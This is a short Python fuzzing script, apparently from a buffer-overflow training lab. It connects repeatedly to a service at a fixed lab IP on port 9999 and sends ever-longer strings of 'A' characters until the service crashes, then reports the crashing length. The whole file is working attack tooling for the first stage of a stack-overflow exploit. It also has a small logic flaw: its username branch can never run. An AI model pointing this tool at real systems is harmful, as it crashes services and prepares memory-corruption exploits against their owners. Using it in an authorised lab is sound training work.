#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.56.119"

port = 9999
timeout = 5
#prefix = "OVERFLOW10 "

#string = prefix + "A" * 100
string = "A" * 100

count = 0

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))

      s.recv(1024)

      if count != 0:
        s.send(bytes("Username", "latin-1"))
        count = count + 1

      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)